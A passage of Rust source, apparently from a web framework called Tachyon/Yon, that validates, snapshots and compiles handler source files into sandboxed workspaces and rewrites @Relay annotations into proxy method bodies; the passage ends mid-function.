use super::cache::CacheDirectory;
use crate::Failure;
use crate::failure::{diagnostic, source_span};
use cap_fs_ext::{DirExt as _, FollowSymlinks, OpenOptionsFollowExt as _};
use cap_std::ambient_authority;
use cap_std::fs::{Dir, OpenOptions};
use command_group::CommandGroup as _;
use sha2::{Digest as _, Sha256};
use std::collections::BTreeMap;
use std::fmt;
use std::fs;
use std::io::{Read as _, Write as _};
use std::path::{Component, Path, PathBuf};
use std::process::{ExitStatus, Stdio};
use std::sync::Arc;
use std::time::{Duration, Instant};

const MAX_HANDLER_SOURCE_BYTES: u64 = 1024 * 1024;
const MAX_HANDLER_DEPENDENCY_BYTES: u64 = 16 * 1024 * 1024;
const MAX_HANDLER_DEPENDENCY_TOTAL_BYTES: u64 = 64 * 1024 * 1024;
const MAX_HANDLER_DEPENDENCY_FILES: usize = 4_096;
const COMPILER_OUTPUT_BYTES: usize = 1024 * 1024;
const COMPILER_DEADLINE: Duration = Duration::from_mins(1);

#[derive(Debug)]
struct CompilerOutput {
    status: ExitStatus,
    stdout: Vec<u8>,
    stderr: Vec<u8>,
    overflow: bool,
}

/// A runtime-only directory that owns every cached artifact used by a source.
struct RuntimeWorkspace {
    directory: tempfile::TempDir,
}

/// An owned, immutable source tree used after discovery has released its
/// project capability.
///
/// Project discovery can share one instance across every route so relative
/// identities remain stable, while standalone handler discovery creates one
/// containing only the selected source. Nothing invoked by the supervisor
/// reopens the authored source path.
pub(crate) struct OwnedSourceRoot {
    workspace: Arc<RuntimeWorkspace>,
}

impl OwnedSourceRoot {
    pub(crate) fn new_project(portable: &str) -> Result<Arc<Self>, Failure> {
        RuntimeWorkspace::new(portable).map(|workspace| Arc::new(Self { workspace }))
    }

    pub(crate) fn stage(
        &self,
        relative: &Path,
        bytes: &[u8],
        portable: &str,
    ) -> Result<(), Failure> {
        let destination = self.workspace.path().join(relative);
        if let Some(parent) = destination.parent() {
            fs::create_dir_all(parent).map_err(|error| {
                invalid_source(portable, &format!("Cannot create source snapshot: {error}"))
            })?;
        }
        write_compiler_file(&destination, bytes, portable)
    }

    pub(crate) fn path(&self) -> &Path {
        self.workspace.path()
    }
}

impl fmt::Debug for OwnedSourceRoot {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("OwnedSourceRoot(<owned>)")
    }
}

impl RuntimeWorkspace {
    fn new(portable: &str) -> Result<Arc<Self>, Failure> {
        tempfile::Builder::new()
            .prefix("tachyon-handler-runtime-")
            .tempdir()
            .map(|directory| Arc::new(Self { directory }))
            .map_err(|error| {
                invalid_source(
                    portable,
                    &format!("Cannot create runtime workspace: {error}"),
                )
            })
    }

    fn path(&self) -> &Path {
        self.directory.path()
    }
}

impl fmt::Debug for RuntimeWorkspace {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str("RuntimeWorkspace(<owned>)")
    }
}

fn validate_runtime_workspace_paths(
    interpreter: &[String],
    workspace: &RuntimeWorkspace,
    portable: &str,
) -> Result<(), Failure> {
    let workspace = fs::canonicalize(workspace.path()).map_err(|error| {
        invalid_source(
            portable,
            &format!("Cannot validate the runtime workspace: {error}"),
        )
    })?;
    for argument in interpreter {
        let candidate = argument
            .split_once('=')
            .map_or(argument.as_str(), |(_, value)| value);
        let path = Path::new(candidate);
        if !path.is_absolute() {
            continue;
        }
        let canonical = fs::canonicalize(path).map_err(|error| {
            invalid_source(
                portable,
                &format!("Cannot validate a runtime artifact: {error}"),
            )
        })?;
        if !canonical.starts_with(&workspace) {
            return Err(invalid_source(
                portable,
                "A prepared handler artifact escaped its owned runtime workspace.",
            ));
        }
    }
    Ok(())
}

fn handler_cache(project: &Dir, portable: &str) -> Result<CacheDirectory, Failure> {
    CacheDirectory::open_project(project).map_err(|error| {
        invalid_source(
            portable,
            &format!("Handler cache ancestors must remain non-symlinked directories: {error}"),
        )
    })
}

fn cache_failure(portable: &str, context: &str, error: impl fmt::Display) -> Failure {
    invalid_source(portable, &format!("{context}: {error}"))
}

fn bounded_compiler_output(
    program: &str,
    arguments: &[String],
    current_dir: Option<&Path>,
) -> Result<CompilerOutput, String> {
    bounded_compiler_output_with_limits(
        program,
        arguments,
        current_dir,
        COMPILER_DEADLINE,
        COMPILER_OUTPUT_BYTES,
    )
}

fn bounded_compiler_output_with_limits(
    program: &str,
    arguments: &[String],
    current_dir: Option<&Path>,
    compiler_deadline: Duration,
    output_bytes: usize,
) -> Result<CompilerOutput, String> {
    let mut command = std::process::Command::new(program);
    command
        .args(arguments)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    if let Some(directory) = current_dir {
        command.current_dir(directory);
    }
    let mut child = command.group_spawn().map_err(|error| error.to_string())?;
    let drain = move |mut pipe: Box<dyn std::io::Read + Send>| {
        std::thread::spawn(move || {
            let mut kept = Vec::new();
            let mut chunk = [0_u8; 8192];
            let mut overflow = false;
            loop {
                let read = pipe.read(&mut chunk).unwrap_or(0);
                if read == 0 {
                    break;
                }
                let remaining = output_bytes.saturating_sub(kept.len());
                kept.extend_from_slice(&chunk[..read.min(remaining)]);
                overflow |= read > remaining;
            }
            (kept, overflow)
        })
    };
    let stdout = drain(Box::new(
        child
            .inner()
            .stdout
            .take()
            .ok_or("missing compiler stdout")?,
    ));
    let stderr = drain(Box::new(
        child
            .inner()
            .stderr
            .take()
            .ok_or("missing compiler stderr")?,
    ));
    let deadline = Instant::now() + compiler_deadline;
    let status = loop {
        if let Some(status) = child.try_wait().map_err(|error| error.to_string())? {
            break status;
        }
        if Instant::now() >= deadline {
            let _killed = child.kill();
            let _waited = child.wait();
            let _stdout = stdout.join();
            let _stderr = stderr.join();
            return Err(format!(
                "compiler exceeded its {} millisecond deadline",
                compiler_deadline.as_millis()
            ));
        }
        std::thread::sleep(Duration::from_millis(5));
    };
    let (stdout, stdout_overflow) = stdout.join().map_err(|_| "compiler stdout reader failed")?;
    let (stderr, stderr_overflow) = stderr.join().map_err(|_| "compiler stderr reader failed")?;
    Ok(CompilerOutput {
        status,
        stdout,
        stderr,
        overflow: stdout_overflow || stderr_overflow,
    })
}

/// A Phase 2 Yon handler language.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum HandlerLanguage {
    /// ECMAScript module executed by a decorator-capable runtime.
    JavaScript,
    /// Python module executed by `CPython`.
    Python,
    /// `TypeScript` executed by the JavaScript runtime, which has to be one
    /// that reads it: Bun and Deno do, Node does not.
    TypeScript,
    /// One of the five framework-owned direct or compiled runtimes.
    Direct,
}

impl HandlerLanguage {
    /// Returns the stable adapter identifier recorded in manifests.
    #[must_use]
    pub const fn adapter(self) -> &'static str {
        match self {
            Self::JavaScript => "javascript.v1",
            Self::Python => "python.v1",
            Self::TypeScript | Self::Direct => "direct.v1",
        }
    }

    /// Returns the public language identifier.
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::JavaScript => "javascript",
            Self::Python => "python",
            Self::TypeScript => "typescript",
            Self::Direct => "direct",
        }
    }
}

/// A validated, project-contained Yon handler source.
pub struct HandlerSource {
    project_root: PathBuf,
    relative_path: String,
    absolute_path: PathBuf,
    language: HandlerLanguage,
    interpreter: Vec<String>,
    /// Whether `interpreter` already names the artefact to run.
    ///
    /// A compiled handler is started by its build output, so appending the
    /// source path after it would hand the program its own source as an
    /// argument.
    prebuilt: bool,
    /// The exact validated source bytes captured during discovery.
    source_bytes: Arc<[u8]>,
    /// Owns the source path used by every non-prebuilt invocation.
    source_root: Arc<OwnedSourceRoot>,
    /// Owns any prepared runtime copy named by `interpreter`.
    prepared_workspace: Option<Arc<RuntimeWorkspace>>,
}

impl Clone for HandlerSource {
    fn clone(&self) -> Self {
        Self {
            project_root: self.project_root.clone(),
            relative_path: self.relative_path.clone(),
            absolute_path: self.absolute_path.clone(),
            language: self.language,
            interpreter: self.interpreter.clone(),
            prebuilt: self.prebuilt,
            source_bytes: Arc::clone(&self.source_bytes),
            source_root: Arc::clone(&self.source_root),
            prepared_workspace: self.prepared_workspace.clone(),
        }
    }
}

impl fmt::Debug for HandlerSource {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("HandlerSource")
            .field("project_root", &self.project_root)
            .field("relative_path", &self.relative_path)
            .field("absolute_path", &self.absolute_path)
            .field("language", &self.language)
            .field("interpreter", &self.interpreter)
            .field("prebuilt", &self.prebuilt)
            .field("source_bytes", &"<owned>")
            .field("source_root", &"<owned>")
            .field(
                "prepared_workspace",
                &self.prepared_workspace.as_ref().map(|_| "<owned>"),
            )
            .finish()
    }
}

impl PartialEq for HandlerSource {
    fn eq(&self, other: &Self) -> bool {
        self.project_root == other.project_root
            && self.relative_path == other.relative_path
            && self.absolute_path == other.absolute_path
            && self.language == other.language
            && self.prebuilt == other.prebuilt
            && self.source_bytes == other.source_bytes
    }
}

impl Eq for HandlerSource {}

impl HandlerSource {
    /// Discovers and validates one project-relative `yon.js` or `yon.py`.
    ///
    /// # Errors
    ///
    /// Returns stable diagnostics for missing, unsafe, oversized, non-UTF-8,
    /// NUL-containing, or unsupported handler source.
    pub fn discover(
        project_root: impl AsRef<Path>,
        relative_source: impl AsRef<Path>,
    ) -> Result<Self, Failure> {
        let project_root = canonical_root(project_root.as_ref())?;
        let relative_source = validate_relative_source(relative_source.as_ref())?;
        let project =
            Dir::open_ambient_dir(&project_root, ambient_authority()).map_err(|error| {
                Failure::one(diagnostic(
                    2001,
                    format!(
                        "Cannot open handler project root '{}': {error}",
                        project_root.display()
                    ),
                    None,
                    None,
                ))
            })?;
        Self::discover_opened(project_root, &project, relative_source)
    }

    pub(crate) fn discover_opened(
        project_root: PathBuf,
        project: &Dir,
        relative_source: &Path,
    ) -> Result<Self, Failure> {
        let relative_source = validate_relative_source(relative_source)?;
        let portable = portable(relative_source);
        let sources = capture_runtime_sources(project, relative_source, &portable)?;
        let bytes = sources.get(relative_source).cloned().ok_or_else(|| {
            Failure::one(diagnostic(
                2001,
                format!("Cannot inspect handler source '{portable}': source does not exist"),
                None,
                source_span(&portable, 0, portable.len()),
            ))
        })?;
        let source_root = OwnedSourceRoot::new_project(&portable)?;
        for (relative, captured) in sources {
            source_root.stage(&relative, &captured, &portable)?;
        }
        Self::discover_snapshot(project_root, project, relative_source, bytes, source_root)
    }

    /// Validates source bytes already captured from the caller's project
    /// capability and binds all later execution to its owned snapshot.
    pub(crate) fn discover_snapshot(
        project_root: PathBuf,
        project: &Dir,
        relative_source: &Path,
        bytes: Vec<u8>,
        source_root: Arc<OwnedSourceRoot>,
    ) -> Result<Self, Failure> {
        let relative_source = validate_relative_source(relative_source)?;
        let portable = portable(relative_source);
        if bytes.len() as u64 > MAX_HANDLER_SOURCE_BYTES {
            return Err(invalid_source(
                &portable,
                "Handler source exceeds the 1 MiB Phase 2 limit.",
            ));
        }
        if bytes.contains(&0) {
            return Err(invalid_source(
                &portable,
                "Handler source contains a NUL byte.",
            ));
        }
        let contents = std::str::from_utf8(&bytes)
            .map_err(|_| invalid_source(&portable, "Handler source must be valid UTF-8."))?;
        if contents.starts_with("#!") && crate::stereotype::is_annotated_language(relative_source) {
            return Err(Failure::one(diagnostic(
                2003,
                format!("Handler source '{portable}' begins with a shebang."),
                Some(String::from(
                    "Yon owns the runtime for every supported language. Delete the first line; \
                     executable bits and self-selected interpreters are not handler APIs.",
                )),
                source_span(&portable, 0, contents.lines().next().map_or(0, str::len)),
            )));
        }
        if crate::stereotype::is_annotated_language(relative_source) {
            crate::stereotype::check(relative_source, contents)?;
            validate_relay_placement(relative_source, contents, &portable)?;
        }
        let (language, interpreter, prebuilt, prepared_workspace) =
            language(relative_source, &bytes, &portable, project)?;
        if let Some(workspace) = prepared_workspace.as_deref() {
            validate_runtime_workspace_paths(&interpreter, workspace, &portable)?;
        }
        let absolute_path = project_root.join(relative_source);
        Ok(Self {
            project_root,
            relative_path: portable,
            absolute_path,
            language,
            interpreter,
            prebuilt,
            source_bytes: Arc::from(bytes),
            source_root,
            prepared_workspace,
        })
    }

    /// Returns whether the interpreter command already names what to run.
    #[must_use]
    pub const fn prebuilt(&self) -> bool {
        self.prebuilt
    }

    /// Returns the canonical project root.
    #[must_use]
    pub fn project_root(&self) -> &Path {
        &self.project_root
    }

    /// Returns the portable project-relative source path.
    #[must_use]
    pub fn relative_path(&self) -> &str {
        &self.relative_path
    }

    /// Returns the canonical absolute source path.
    #[must_use]
    pub fn absolute_path(&self) -> &Path {
        &self.absolute_path
    }

    /// Returns the selected language adapter.
    #[must_use]
    pub const fn language(&self) -> HandlerLanguage {
        self.language
    }

    /// Returns the Tachyon-owned runtime or compiled-artifact command.
    #[must_use]
    pub fn interpreter(&self) -> &[String] {
        &self.interpreter
    }

    /// Returns the immutable bytes validated during discovery.
    #[must_use]
    pub(crate) fn source_bytes(&self) -> &[u8] {
        &self.source_bytes
    }

    /// Returns the owned source path used for execution.
    #[must_use]
    pub(crate) fn execution_path(&self) -> PathBuf {
        self.source_root.path().join(&self.relative_path)
    }

    /// Returns the owned project-shaped source root used for execution.
    #[must_use]
    pub(crate) fn execution_root(&self) -> &Path {
        self.source_root.path()
    }

    /// Returns the immutable owned project-shaped source root.
    #[must_use]
    pub(crate) fn execution_working_directory(&self) -> &Path {
        self.source_root.path()
    }
}

fn capture_runtime_sources(
    project: &Dir,
    relative_source: &Path,
    portable_source: &str,
) -> Result<BTreeMap<PathBuf, Vec<u8>>, Failure> {
    let mut files = BTreeMap::new();
    let mut total = 0_u64;
    match project.symlink_metadata("server") {
        Ok(metadata) => {
            if metadata.is_symlink() || !metadata.is_dir() {
                return Err(invalid_source(
                    portable_source,
                    "Handler server root must be a regular, non-symlinked directory.",
                ));
            }
            let server = source_io(project.open_dir_nofollow("server"), portable_source)?;
            capture_server_directory(
                &server,
                Path::new("server"),
                portable_source,
                &mut files,
                &mut total,
            )?;
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return source_io(Err(error), portable_source),
    }
    if is_middleware(relative_source) {
        capture_project_dependency(
            project,
            relative_source,
            portable_source,
            &mut files,
            &mut total,
        )?;
    }
    Ok(files)
}

fn capture_project_dependency(
    project: &Dir,
    relative: &Path,
    portable_source: &str,
    files: &mut BTreeMap<PathBuf, Vec<u8>>,
    total: &mut u64,
) -> Result<(), Failure> {
    let portable = portable(relative);
    let metadata = source_io(project.symlink_metadata(relative), &portable)?;
    if metadata.is_symlink() || !metadata.is_file() {
        return Err(invalid_source(
            &portable,
            "Handler dependencies must be regular, non-symlinked files.",
        ));
    }
    if metadata.len() > MAX_HANDLER_DEPENDENCY_BYTES {
        return Err(invalid_source(
            &portable,
            "Handler dependency exceeds the 16 MiB per-file limit.",
        ));
    }
    if files.len() >= MAX_HANDLER_DEPENDENCY_FILES {
        return Err(invalid_source(
            portable_source,
            "Handler source snapshot exceeds the 4,096-file limit.",
        ));
    }
    let mut options = OpenOptions::new();
    options.read(true).follow(FollowSymlinks::No);
    let mut source = source_io(project.open_with(relative, &options), &portable)?;
    let mut bytes = Vec::new();
    source_io(source.read_to_end(&mut bytes), &portable)?;
    *total = total.saturating_add(bytes.len() as u64);
    if *total > MAX_HANDLER_DEPENDENCY_TOTAL_BYTES {
        return Err(invalid_source(
            portable_source,
            "Handler source snapshot exceeds the 64 MiB total limit.",
        ));
    }
    files.insert(relative.to_path_buf(), bytes);
    Ok(())
}

fn capture_server_directory(
    directory: &Dir,
    relative_directory: &Path,
    portable_source: &str,
    files: &mut BTreeMap<PathBuf, Vec<u8>>,
    total: &mut u64,
) -> Result<(), Failure> {
    let entries = source_io(directory.entries(), portable_source)?;
    let mut entries = entries.collect::<Result<Vec<_>, _>>().map_err(|error| {
        invalid_source(
            portable_source,
            &format!("Cannot enumerate owned server sources: {error}"),
        )
    })?;
    entries.sort_by_key(cap_std::fs::DirEntry::file_name);
    for entry in entries {
        let name = entry.file_name();
        let relative = relative_directory.join(&name);
        let portable = portable(&relative);
        let metadata = source_io(directory.symlink_metadata(&name), &portable)?;
        if metadata.is_symlink() {
            return Err(invalid_source(
                &portable,
                "Symlinked handler dependencies are not allowed.",
            ));
        }
        if metadata.is_dir() {
            let child = source_io(directory.open_dir_nofollow(&name), &portable)?;
            capture_server_directory(&child, &relative, portable_source, files, total)?;
            continue;
        }
        if !metadata.is_file() {
            return Err(invalid_source(
                &portable,
                "Handler dependencies must be regular files or directories.",
            ));
        }
        if metadata.len() > MAX_HANDLER_DEPENDENCY_BYTES {
            return Err(invalid_source(
                &portable,
                "Handler dependency exceeds the 16 MiB per-file limit.",
            ));
        }
        if files.len() >= MAX_HANDLER_DEPENDENCY_FILES {
            return Err(invalid_source(
                portable_source,
                "Handler server snapshot exceeds the 4,096-file limit.",
            ));
        }
        let mut options = OpenOptions::new();
        options.read(true).follow(FollowSymlinks::No);
        let mut source = source_io(directory.open_with(&name, &options), &portable)?;
        let mut bytes = Vec::new();
        source_io(source.read_to_end(&mut bytes), &portable)?;
        *total = total.saturating_add(bytes.len() as u64);
        if *total > MAX_HANDLER_DEPENDENCY_TOTAL_BYTES {
            return Err(invalid_source(
                portable_source,
                "Handler server snapshot exceeds the 64 MiB total limit.",
            ));
        }
        files.insert(relative, bytes);
    }
    Ok(())
}

fn canonical_root(root: &Path) -> Result<PathBuf, Failure> {
    let canonical = fs::canonicalize(root).map_err(|error| {
        Failure::one(diagnostic(
            2001,
            format!(
                "Cannot open handler project root '{}': {error}",
                root.display()
            ),
            Some(String::from("Pass an existing readable project directory.")),
            None,
        ))
    })?;
    if !canonical.is_dir() {
        return Err(Failure::one(diagnostic(
            2001,
            format!(
                "Handler project root '{}' is not a directory.",
                canonical.display()
            ),
            None,
            None,
        )));
    }
    Ok(canonical)
}

fn validate_relative_source(source: &Path) -> Result<&Path, Failure> {
    if source.as_os_str().is_empty()
        || source.is_absolute()
        || source.components().any(
            |component| !matches!(component, Component::Normal(value) if value.to_str().is_some()),
        )
        || !(source.starts_with("server/routes")
            || source.starts_with("server/workers")
            || is_middleware(source))
    {
        return Err(Failure::one(diagnostic(
            2002,
            format!(
                "Handler source '{}' is not a safe project-relative route path.",
                source.display()
            ),
            Some(String::from(
                "Use server/routes/**, server/workers/**, or a root middleware source.",
            )),
            None,
        )));
    }
    Ok(source)
}

/// Compilers Tachyon drives for a handler that has to be built before it runs.
///
/// An ahead-of-time language cannot be started from source, but that is a
/// build step, not a reason to make the developer write a manifest. Each entry
/// turns one source file into one artefact with no project file, and the
/// artefact is cached under the source digest so the cost is paid once.
///
/// `{src}` and `{out}` are substituted. `run` is the prefix that executes the
/// artefact — empty when the artefact is itself an executable.
struct Compiler {
    compile: &'static [&'static str],
    run: &'static [&'static str],
    suffix: &'static str,
}

struct PreparedCommand {
    interpreter: Vec<String>,
    workspace: Arc<RuntimeWorkspace>,
}

type LanguageResolution = (
    HandlerLanguage,
    Vec<String>,
    bool,
    Option<Arc<RuntimeWorkspace>>,
);

// The compiled languages Yon runs, which are the compiled languages that can
// carry a class annotation. C, C++ and Go were here while Yon ran anything
// that could read JSON on stdin; a handler declares its layer now, and they
// cannot make that declaration. They are reached through a delegate instead.
const BUILT_IN_COMPILERS: &[(&str, Compiler)] = &[
    (
        "kt",
        Compiler {
            compile: &["kotlinc", "{src}", "-include-runtime", "-d", "{out}"],
            run: &["java", "-jar"],
            suffix: ".jar",
        },
    ),
    (
        // 2024, because the protocol prelude appended after the handler uses a
        // let chain. The edition is Tachyon's to choose: the handler is one
        // file compiled by a command Tachyon writes, so there is no manifest
        // the author could have set it in.
        "rs",
        Compiler {
            compile: &["rustc", "--edition", "2024", "-O", "-o", "{out}", "{src}"],
            run: &[],
            suffix: "",
        },
    ),
];

/// Returns the built-in compiler for one extension, if there is one.
fn built_in_compiler(extension: &str) -> Option<&'static Compiler> {
    BUILT_IN_COMPILERS
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(extension))
        .map(|(_, compiler)| compiler)
}

/// Runs one compiler and turns a failure into a handler diagnostic.
///
/// Shared by the handler's own compile and by the stereotype crate it may need
/// first, so a missing toolchain reads the same either way rather than the
/// second one failing in a shape nobody wrote a message for.
fn run_compiler(program: &str, arguments: &[String], portable: &str) -> Result<(), Failure> {
    let output = match bounded_compiler_output(program, arguments, None) {
        Ok(output) => output,
        Err(error) if error.contains("No such file") => {
            return Err(invalid_source(
                portable,
                &format!("Compiling this handler needs '{program}', which is not on PATH."),
            ));
        }
        Err(error) => {
            return Err(invalid_source(
                portable,
                &format!("Cannot start '{program}': {error}"),
            ));
        }
    };
    if output.overflow {
        return Err(invalid_source(
            portable,
            "Compiler output exceeded the 1 MiB diagnostic limit.",
        ));
    }
    if !output.status.success() {
        let detail = String::from_utf8_lossy(&output.stderr);
        return Err(invalid_source(
            portable,
            &format!(
                "Handler failed to compile: {}",
                detail
                    .lines()
                    .find(|line| line.contains("error"))
                    .or_else(|| detail.lines().find(|line| !line.trim().is_empty()))
                    .unwrap_or("no detail")
                    .trim()
            ),
        ));
    }
    Ok(())
}

/// Materializes inert relay annotations into proxy method bodies.
///
/// Java, Kotlin, C#, and PHP can retain metadata on a method but cannot let an
/// annotation replace that method. Yon performs the same bounded source-time
/// rewrite Rust's `Relay` procedural macro performs, so a controller can call
/// an annotated delegate normally and the authored placeholder body never
/// executes.
fn materialize_compiled_relays(
    extension: &str,
    source: &str,
    portable: &str,
) -> Result<String, Failure> {
    let marker = match extension {
        "java" | "kt" => "@Relay(",
        "cs" => "[Relay(",
        "php" => "#[Relay(",
        _ => return Ok(String::from(source)),
    };
    let code = code_bytes(extension, source, portable)?;
    let mut replacements = Vec::new();
    let mut cursor = 0;
    while let Some(annotation_start) = find_code_marker(source, marker, cursor, &code) {
        if !relay_belongs_to_delegate(extension, source, annotation_start, &code) {
            return Err(invalid_source(
                portable,
                "@Relay must annotate a method on the enclosing @Delegate class.",
            ));
        }
        let arguments_start = annotation_start + marker.len();
        let Some(arguments_end) =
            matching_delimiter(source, arguments_start - 1, b'(', b')', &code)
        else {
            return Err(invalid_source(portable, "Malformed @Relay annotation."));
        };
        let command = quoted_literals(&source[arguments_start..arguments_end]);
        if command.is_empty()
            || !relay_arguments_are_literals(&source[arguments_start..arguments_end])
        {
            return Err(invalid_source(
                portable,
                "Malformed @Relay annotation: expected quoted command arguments.",
            ));
        }
        let mut signature_start = arguments_end + 1;
        if extension == "cs" || extension == "php" {
            signature_start += usize::from(source.as_bytes().get(signature_start) == Some(&b']'));
        }
        // Kotlin commonly places @JvmStatic between @Relay and the function.
        loop {
            signature_start += source[signature_start..]
                .find(|character: char| !character.is_whitespace())
                .unwrap_or_default();
            if !source[signature_start..].starts_with('@') {
                break;
            }
            signature_start = source[signature_start..]
                .find('\n')
                .map_or(source.len(), |line| signature_start + line + 1);
        }
        let parameters_open = find_code_byte(source, signature_start, b'(', &code)
            .filter(|open| !has_code_boundary(source, signature_start, *open, &code))
            .ok_or_else(|| {
                invalid_source(
                    portable,
                    "Malformed @Relay method signature: expected a method parameter list.",
                )
            })?;
        let Some(parameters_close) = matching_delimiter(source, parameters_open, b'(', b')', &code)
        else {
            return Err(invalid_source(
                portable,
                "Malformed @Relay method signature.",
            ));
        };
        let binding = relay_binding(extension, &source[parameters_open + 1..parameters_close]);
        let body_start = parameters_close + 1;
        let body_open = find_code_byte(source, body_start, b'{', &code)
            .filter(|open| !has_code_boundary(source, body_start, *open, &code))
            .ok_or_else(|| {
                invalid_source(
                    portable,
                    "Malformed @Relay method body: expected a braced placeholder body.",
                )
            })?;
        let Some(body_close) = matching_delimiter(source, body_open, b'{', b'}', &code) else {
            return Err(invalid_source(portable, "Malformed @Relay method body."));
        };
        let command = command.join(", ");
        let invocation = match extension {
            "java" => format!("{{ return Yon.relay(java.util.List.of({command}), {binding}); }}"),
            "kt" => format!("{{ return Yon.relay(listOf({command}), {binding}) }}"),
            "cs" => format!("{{ return Yon.Relay(new[] {{ {command} }}, {binding}); }}"),
            "php" => format!("{{ return Yon::relay([{command}], {binding}); }}"),
            _ => unreachable!(),
        };
        replacements.push((body_open, body_close + 1, invocation));
        cursor = body_close + 1;
    }
    let mut materialized = String::from(source);
    for (start, end, replacement) in replacements.into_iter().rev() {
        materialized.replace_range(start..end, &replacement);
    }
    Ok(materialized)
}

fn relay_arguments_are_literals(source: &str) -> bool {
    let bytes = source.as_bytes();
    let mut at = 0;
    while at < bytes.len() {
        if bytes[at].is_ascii_whitespace()
            || bytes[at] == b','
            || bytes[at] == b'{'
            || bytes[at] == b'}'
        {
            at += 1;
            continue;
        }
        if bytes[at] != b'"' && bytes[at] != b'\'' {
            return false;
        }
        let quote = bytes[at];
        at += 1;
        let mut closed = false;
        while at < bytes.len() {
            if bytes[at] == b'\\' {
                at = (at + 2).min(bytes.len());
            } else if bytes[at] == quote {
                at += 1;
                closed = true;
                break;
            } else {
                at += 1;
            }
        }
        if !closed {
            return false;
        }
    }
    true
}

fn relay_belongs_to_delegate(extension: &str, source: &str, before: usize, code: &[bool]) -> bool {
    let (delegate, layers): (&str, &[&str]) = match extension {
        "java" | "kt" => (
            "@Delegate",
            &[
                "@Controller",
                "@Service",
                "@Repository",
                "@Client",
                "@Delegate",
            ],
        ),
        "cs" => (
            "[Delegate]",
            &[
                "[Controller]",
                "[Service]",
                "[Repository]",
                "[Client]",
                "[Delegate]",
            ],
        ),
        "php" => (
            "#[Delegate]",
            &[
                "#[Controller]",
                "#[Service]",
                "#[Repository]",
                "#[Client]",
                "#[Delegate]",
            ],
        ),
        _ => return false,
    };
    layers
        .iter()
        .filter_map(|layer| {
            find_last_annotation_marker(source, layer, before, code).map(|at| (at, *layer))
        })
        .max_by_key(|(at, _)| *at)
        .is_some_and(|(_, layer)| layer == delegate)
}

fn find_code_marker(source: &str, marker: &str, from: usize, code: &[bool]) -> Option<usize> {
    let mut cursor = from;
    while let Some(offset) = source[cursor..].find(marker) {
        let at = cursor + offset;
        if code.get(at).copied().unwrap_or(false) {
            return Some(at);
        }
        cursor = at + marker.len();
    }
    None
}

fn find_code_marker_ascii_case(
    source: &str,
    marker: &str,
    from: usize,
    code: &[bool],
) -> Option<usize> {
    source.as_bytes()[from..]
        .windows(marker.len())
        .enumerate()
        .find_map(|(offset, candidate)| {
            let at = from + offset;
            (code.get(at) == Some(&true) && candidate.eq_ignore_ascii_case(marker.as_bytes()))
                .then_some(at)
        })
}

fn find_code_byte(source: &str, from: usize, needle: u8, code: &[bool]) -> Option<usize> {
    source
        .as_bytes()
        .iter()
        .enumerate()
        .skip(from)
        .find_map(|(at, byte)| (*byte == needle && code.get(at) == Some(&true)).then_some(at))
}

fn has_code_boundary(source: &str, from: usize, before: usize, code: &[bool]) -> bool {
    source.as_bytes()[from..before]
        .iter()
        .enumerate()
        .any(|(offset, byte)| {
            matches!(byte, b'{' | b'}' | b';' | b'=') && code.get(from + offset) == Some(&true)
        })
}

fn annotation_name_boundary(source: &str, marker: &str, at: usize) -> bool {
    source.as_bytes().get(at + marker.len()).is_none_or(|byte| {
        byte.is_ascii_whitespace()
            || if marker.ends_with(']') {
                matches!(byte, b'[' | b'#')
            } else {
                *byte == b'('
            }
    })
}

fn find_annotation_marker(source: &str, marker: &str, from: usize, code: &[bool]) -> Option<usize> {
    let mut cursor = from;
    while let Some(at) = find_code_marker_ascii_case(source, marker, cursor, code) {
        if annotation_name_boundary(source, marker, at) {
            return Some(at);
        }
        cursor = at + marker.len();
    }
    None
}

fn find_last_annotation_marker(
    source: &str,
    marker: &str,
    before: usize,
    code: &[bool],
) -> Option<usize> {
    let mut cursor = 0;
    let mut last = None;
    while let Some(at) = find_annotation_marker(&source[..before], marker, cursor, code) {
        last = Some(at);
        cursor = at + marker.len();
    }
    last
}

fn code_bytes(extension: &str, source: &str, portable: &str) -> Result<Vec<bool>, Failure> {
    let mask = crate::lexical::code_mask(extension, source);
    if let Some(error) = mask.error {
        return Err(invalid_source(portable, &format!("{error} before @Relay.")));
    }
    Ok(mask.code)
}

#[derive(Clone, Copy)]
struct RelayScope {
    delegate: bool,
    open: usize,
    close: usize,
}

fn layer_spellings(extension: &str) -> [(&'static str, bool); 5] {
    match extension {
        "cs" => [
            ("[Controller]", false),
            ("[Service]", false),
            ("[Repository]", false),
            ("[Client]", false),
            ("[Delegate]", true),
        ],
        "php" | "rs" => [
            ("#[Controller]", false),
            ("#[Service]", false),
            ("#[Repository]", false),
            ("#[Client]", false),
            ("#[Delegate]", true),
        ],
        _ => [
            ("@Controller", false),
            ("@Service", false),
            ("@Repository", false),
            ("@Client", false),
            ("@Delegate", true),
        ],
    }
}

fn relay_marker(extension: &str) -> &'static str {
    match extension {
        "cs" => "[Relay(",
        "php" | "rs" => "#[Relay(",
        _ => "@Relay(",
    }
}

fn brace_relay_scopes(extension: &str, source: &str, code: &[bool]) -> Vec<RelayScope> {
    let mut scopes = Vec::new();
    for (layer, delegate) in layer_spellings(extension) {
        let mut cursor = 0;
        while let Some(annotation) = find_annotation_marker(source, layer, cursor, code) {
            cursor = annotation + layer.len();
            let Some(open) = find_code_byte(source, cursor, b'{', code) else {
                continue;
            };
            if has_code_boundary(source, cursor, open, code) {
                if extension == "rs" && delegate {
                    add_rust_impl_scopes(source, cursor, open, code, &mut scopes);
                }
                continue;
            }
            if let Some(close) = matching_delimiter(source, open, b'{', b'}', code) {
                scopes.push(RelayScope {
                    delegate,
                    open,
                    close,
                });
            }
            if extension == "rs" && delegate {
                add_rust_impl_scopes(source, cursor, open, code, &mut scopes);
            }
        }
    }
    scopes
}

fn add_rust_impl_scopes(
    source: &str,
    declaration_start: usize,
    declaration_end: usize,
    code: &[bool],
    scopes: &mut Vec<RelayScope>,
) {
    let Some((keyword, declaration)) = ["struct", "enum"]
        .into_iter()
